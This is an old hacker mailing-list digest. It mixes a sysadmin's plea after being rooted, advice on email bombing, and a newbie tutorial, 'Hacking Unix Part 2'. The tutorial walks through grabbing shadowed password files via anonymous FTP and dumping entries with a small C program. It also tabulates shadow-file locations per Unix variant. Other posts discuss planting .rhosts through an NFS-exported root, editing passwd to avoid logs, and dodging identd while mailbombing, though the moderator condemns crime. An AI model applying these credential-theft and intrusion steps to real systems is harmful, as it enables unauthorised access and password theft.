I'VE BEEN ROOTED! 
=============================================================================== 
   Anonymous:

      Hey there - I was wondering if you could answer something for 
      me.

      Over the past weekend, some k-rad elitester decided to take over 
      root on our machine. This happened around 7pm on a Friday, but 
      luckily, one of our admins was still in the office, realized 
      what was happening, and pulled the plug for the weekend.

      We were able to regain root, plug the hole where the guy got in, 
      and (hopefully) got rid of the backdoors he left himself.

      But now I want this guy.

      I've figured out where he came through the wtmp logs, but I 
      don't know where to go from here. What do you recommend to help 
      me track him down? Is there any specific files I should be 
      keeping offline or as a printed record in case proof is ever 
      needed (and what legal issues surround this - ie: is a file 
      permissible as evidence)?

      You've covered hacking quite well, care to cover what to do 
      after being hacked? 
                                                         M@

      First, did you do a complete reinstall of all executables using 
      sources dating before the attack? And are you certain of when 
      the first attack was? Sometimes you can be compromised for a 
      long time before you realize an intruder has been on your 
      system.

      It's probably too late now, but ideally the minute you discover 
      an attack you should take a snapshot of the entire system and 
      save it on tape. That way you can see not only the logs but also 
      what files the intruder was reading, etc. (I'm assuming Unix.) 
      Thus you can get an idea of whether this guy was a basically 
      harmless hacker looking around, or whether it was someone with 
      an agenda. Now I don't want to sound like a knee-jerk pro-hacker 
      type, but according to the FBI, almost no computer crime is 
      committed by hackers.  So if it was just a hacker, you can 
      probably relax. But if it was a computer criminal, you may be in 
      for further attacks.

      To give you more specific info, we need to know exactly what 
      your operating system is and how it was configured.

      Carolyn, just a quick note on 
      >Anyone know a better way to make Win95 behave with Linux?

      I've found a program called : System Commander 3.0.   I'm not 
      trying to advertise here or anything but I believe it will do 
      the trick.  SC3.0 will overwrite your master boot record on your 
      HD so it'll take control on bootup.  You then decide which of 
      all the OS's installed (up to 100), you want to run.   It then 
      shuffles config. files hides partitions and gets outah dah way! 
      leaving no trace in memory.   You can install OS's in their own 
      partitions.   It's not perfect but it helps a lot.  Look it 
      up:

MORE EMAIL BOMB INFO 
===============================================================================

   <Please post as Anonymous>

      If Hacking is an Art, then I am still painting by number, so 
      please don't flame me for my ignorance....  But, I think I know 
      of a way to avoid Email Bombs in some cases.  Could you not get 
      a free email forwarding address like the ones available on 
      BIGFOOT.COM, with a forwarding address to you.  Make your 
      address on bigfoot something like IDIOT@BIGFOOT.COM (Don't use 
      your Hacker Handle!).  Then anytime you give out your email 
      address to people you don't know, give out the bigfoot address. 
      This way, if you begin to get that initial barrage of emails 
      from subscription lists, then just change your forwarding 
      address at Bigfoot to something that doesn't exist.  This 
      solution is only valid, of course, if the perpetrator doesn't 
      know your real email address.  Hopefully, this would avoid 
      frivolous bombings, and serious hackers who could probably 
      somehow get your real address from Bigfoot's servers would have 
      bigger and better things to do.

      Sorry about the length...

      That's what I'm doing in effect with the two email bombings to 
      right now. This crud is being bounced at 
      the router.  Hopefully the owners of the email lists that are 
      bombing me will get tired of the bounced messages and 
      unsubscribe me. It isn't the most elegant way, but that ISP that 
      serves that address for me(Highway Technologies) has such 
      clueless tech support people that they can't do it any other way 
      and won't let me do it for them.

      I have a question/comment regarding port 25 on unix. I've sent bogus mail 
      thru mirc, i.e: irc.phoenix.net 25 [syntax: /server irc.phoenix.net 25] 
      and it worked. I can make a mailbomber using the timer commands in 
      mirc...would this be illegal, do you think this could even be done without 
      being traced? Don't want to get in trouble... <eg> I would appreciate any 
      thoughts on this, thanks again!!!

      Got a suggestion... How about arranging a meeting on IRC for the HH list 
      members (moderated hopefully)? TTYL, If I have something worthy to say!

      Sheesh, you know how I feel about email bombing! In answer to 
      your question, email bombing is illegal as a denial of service 
      attack. But usually the authorities don't prosecute. But email 
      bombers do get into other sorts of trouble. I have had reports 
      of email bombers getting kicked off their ISPs and expelled form 
      school. Now if you were to email bomb a hacker, there are other 
      unpleasant things that can happen to you.

      As for how to keep from getting caught, you need to use a box 
      that isn't running identd. But thanks in part to the rash of 
      email bombing from lots of clueless newbies who imagine it is 
      elite, sysadmins are quickly installing indentd on all their 
      boxes. You know those canned email bomb programs you can 
      download from certain Web sites that I'm working on closing 
      down? Some of these programs say they will keep you anonymous. 
      But that isn't true any more because the owners of the boxes 
      they exploit have installed identd. Also, the authors of these 
      email bomb programs have installed back doors so people in the 
      know can track down the people who use them and extract hacker 
      justice.

CRACKING QUESTIONS 
===============================================================================

   From: beast master <beastmstr@geocities.com>

      Is there any way to set up a remotely executable file on a web 
      site?   for instance, be able to log into the page and launch a 
      browser?  I know it is possible to use AOL's web browser, 
      something like that, but just to a web site....

      thanks!

      Whilst i was doing a random search of systems with both rpcinfo 
      -p and showmount -e, i discovered a system which was exporting 
      their / directory.  This being the first time I've noticed it i 
      was very careful not to do anything. Am I correct in assuming i 
      could mount /root if i so wished and thus insert a .rhosts file 
      which would give me axs?

      If the answer turns out to be 'yes,' I trust that you will 
      advise the owner of that box? Heck, he or she may even ask you 
      to please demonstrate how it's done, and then pay you to fix it. 
      Many people have gotten a start on a lucrative career as a 
      security consultant by making friends this way. Trust me, it's 
      more fun using hacker knowledge to make an honest and very 
      prosperous living than to get thrown in jail. That's how jericho 
      and evil pete make their livings, right?

   Moderator: 
      (jericho means that while in DOS you can interchange caps and 
       lower case, in Unix it makes a difference. All those Unix 
       commands above are lower case: 'cp', 'mv', 'ls', 'rm' 'cd'. But 
       I wouldn't get too critical of the author, after all, he's the 
       first person to start posting really detailed explanations to 
       this list of how to crack into Unix computers.)

      What unix are you on? My telnet surely keeps logs.

   Moderator: 
      (I think he's pointing out that once you are running telnet your 
       commands no longer turn up in the shell log file.  Look, I 
       agree, there are a zillion ways your breakin can be logged, but 
       many sysadmins only look at the obvious.)

      If you are local, they can't help but to give you the passwd 
      file. It must be 644 for many system binaries to run.

      And you will not get the system passwd file.

      There isn't?! On some systems this little script called 
      "unshadow.c" does wonders.

      Gee, why not?! Why don't you explain "that NIS thing"?

      >   You can do whatever you want to the servers http'd system

      No you can't. You were talking about getting on the system with 
      a user account.. unless you are root, you basically can NOT mess 
      with the http server.

      Oh yeah! Mr "don't get logged". How about editing the passwd 
      file directly? Adduser shows up in logs.

      Why not?

      Maybe that's because I've given out interviews in which I say that 
      when I have evidence of a *real* computer crime -- not just some 
      silly kid email bombing me -- I will gladly help the FBI. Thanks to 
      GALF's habit of wiping system files -- which is real crime -- I've 
      provided evidence against them. I've told this to Rogue Agent in 
      private email, too.  I'm against computer crime, got it? But I've 
      done this only as a free service for the people who have been the 
      victims of crime, not for pay.

   Hacking Unix Part 2 
   by od^phreak

      Hello,

      And welcome to my second edition of hacking Unix. This is for 
      newbies pretty much but every edition gets more advanced so 
      young hackers can follow along.and novices can start from the 
      middle and advanced can read codes,idea's,etc...... 
      ------------------------------------------------------- 
      Bypassing Shadowed Passwords And Then Getting Root

      1.Anon Ftp get Shadowed Passwd

      NOTE: these will be shadowed accounts for the administrators of 
      the Ftp system.so this means if you cant unshadow with step 2 
      sometimes the defaults will work which are in this passwd,such 
      as games.  Usually admins don't care to change this so you can login 
      as games to get the real passwd file you know the big one that is 
      likely unshadowed.

   2.Run a program Similar to The following code:

/**************************************************/ 
/* 
 * unlock .c 
 * 
 * Unshadow the Shadow password file 
 * 
 */

#include <pwd.h> 
main() 
{ 
   struct passwd *p; 
   while(p=getpwent()) 
   printf("%s:%s:%d:%d:%s:%s:%s\n", p->pw_name, 
   p->pw_passwd, 
   p->pw_uid, p->pw_gid, p->pw_gecos, p->pw_dir, 
   p->pw_shell); 
} 
/**************************************************/

      Now this is Just a very small Code that will Unshadow on some 
      systems but there are many larger codes that will work on almost any 
      system.

      3. Now that you have it unshadowed if you didn't get root or just 
         want a normal account you can login to a shell as one of the 
         accounts you cracked.and type

         cat /etc/shadow 
         or 
         cat /etc/passwd

         you can look in the following plays for unshadowed backups

   OS type                            Path           Token in = passwd field 
   -------------------------------------------------------------------------= 
   AIX 3                       /etc/security/passwd                 ! 
         or                   /tcb/auth/files/<first letter         # 
                              of username>/<username> 
   A/UX 3.0s                   /tcb/files/auth/?/                   * 
   BSD4.3-Reno                 /etc/master.passwd                   * 
   ConvexOS 10                 /etc/shadpw                          * 
   ConvexOS 11                 /etc/shadow                          * 
   DG/UX                       /etc/tcb/aa/user/                    * 
   EP/IX                       /etc/shadow                          x 
   HP-UX                       /.secure/etc/passwd                  *

   SCO Unix #.2.x              /tcb/auth/files/<first letter        *

   SunOS 5.0                   /etc/shadow 
                              <optional NIS+ private secure 
                              maps/tables/whatever> 
   System V Release 4.0        /etc/shadow                          x

      These exploits to cover your tracks are certainly better than 
      what amateurs like the Gray Areas Liberation Front (GALF) use. 
      The GALF guys simply wipe system files after visiting.  Now on 
      the one had this means GALF leaves fewer tracks. But on the 
      other hand it makes their victims mad. Since GALF usually hacks 
      computers belonging to hackers, these guys are walking down the 
      same path as the Masters of Deception did. They found out that if 
      you make hackers mad enough, they start helping the Feds, and 
      are really good at gathering evidence.

      The problem with even wiping out the system files is that a 
      record is left at the router of where GALF came in from. So 
      computer crime detectives go to the computer the router points 
      to. If that  computer has had its files wiped, we just check out 
      the computer before that, and so on. We know your modus operandi, 
      GALF. Are you going to get mad and hack me again for telling the 
      Happy Hacker list that you aren't elite? Go ahead, make my day!

      Speaking as a former newbie who used to hate the f***** 
      treatment i got from anyone who knew any more than me, i can 
      tell you all, i'm beginning to understand why i received such 
      treatment..

      Once you get any sort of knowledge about hacking.. or even just 
      a good understanding of one or more aspects of it, people begin 
      to ask you questions. You at first think.. "Hey, I must be 
      getting better at this, people are asking me the questions instead 
      of the other way around.." So you answer the questions. Then 
      more questions come. Because you've answered previous ones you 
      feel somewhat obliged to answer some more (maybe that's just me 
      :) ). Anyway what soon happens is that those newbies begin 
      relying on you and thinking of you as a information tap they can 
      turn on and off whenever they like. You eventually get more 
      frustrated as you repeat yourself time and again. But you still 
      want to help the newbies because not only is it something no-one 
      did for you, but it makes you "popular".  You answer questions 
      as fast as they appear, and STILL they want more.  Then one day 
      someone introduced me to the /ignore command. Ah hh sweet bliss.

      Anyways the point i'm trying to make is that often newbies 
      attitude towards hacking is "gimme, gimme, gimme". They don't 
      want to learn the how, only the why. And they won't waste their 
      own time looking for the info themselves if they can beg it off 
      someone else. This is the crux of why some hackers are rather 
      harsh with over enthusiastic newbies. My answer to them is use 
      the /ignore key often. My advice to newbies is to go find it 
      yourself!

      BTW,  How do you find out whether a system is running cgi?
